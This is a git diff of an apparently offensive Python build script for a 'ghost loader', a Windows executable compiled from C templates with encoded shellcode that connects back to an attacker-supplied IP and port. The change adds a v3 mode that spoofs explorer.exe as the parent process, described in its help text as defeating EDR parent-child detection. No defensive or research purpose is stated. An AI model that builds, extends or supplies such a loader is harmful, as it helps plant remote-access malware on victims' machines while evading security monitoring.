@@ -24,7 +24,8 @@ ROOT        = os.path.dirname(os.path.abspath(__file__))
 SHELL_DIR   = os.path.join(ROOT, "shell")
 GHOST_DIR   = os.path.join(ROOT, "ghost-encoder")
 GHOST_SCRIPT = os.path.join(GHOST_DIR, "ghost_encode.py")
-TEMPLATE    = os.path.join(SHELL_DIR, "ghost_loader_template.c")
+TEMPLATE_V2 = os.path.join(SHELL_DIR, "ghost_loader_template.c")
+TEMPLATE_V3 = os.path.join(SHELL_DIR, "ghost_loader_v3_template.c")
 OUTPUT_C    = os.path.join(SHELL_DIR, "ghost_loader_gen.c")
 OUTPUT_EXE  = os.path.join(SHELL_DIR, "ghost_loader.exe")
 
@@ -54,8 +55,10 @@ def err(msg):
     print(f"  {RED}[!]{RST} {msg}")
 
 
-def build(ip, port):
-    print(f"\n  {CYAN}{BOLD}=== GHOST LOADER BUILD --- {ip}:{port} ==={RST}\n")
+def build(ip, port, v3=False):
+    ver = "v3 [PARENT SPOOF]" if v3 else "v2 [DIRECT]"
+    print(f"\n  {CYAN}{BOLD}=== GHOST LOADER BUILD {ver} --- {ip}:{port} ==={RST}\n")
+    TEMPLATE = TEMPLATE_V3 if v3 else TEMPLATE_V2
 
     # ── Step 1: verify ghost-encoder present ──────────────────────────────
     if not os.path.exists(GHOST_SCRIPT):
@@ -153,9 +156,12 @@ def build(ip, port):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print(f"Usage: {sys.argv[0]} <ip> <port>")
-        print(f"  e.g: {sys.argv[0]} 192.168.1.92 4443")
-        sys.exit(1)
-    ok_flag = build(sys.argv[1], sys.argv[2])
+    import argparse
+    ap = argparse.ArgumentParser()
+    ap.add_argument("ip")
+    ap.add_argument("port")
+    ap.add_argument("--v3", action="store_true",
+                    help="v3: parent-process spoof (explorer.exe) — defeats EDR parent-child chain")
+    args = ap.parse_args()
+    ok_flag = build(args.ip, args.port, v3=args.v3)
     sys.exit(0 if ok_flag else 1)
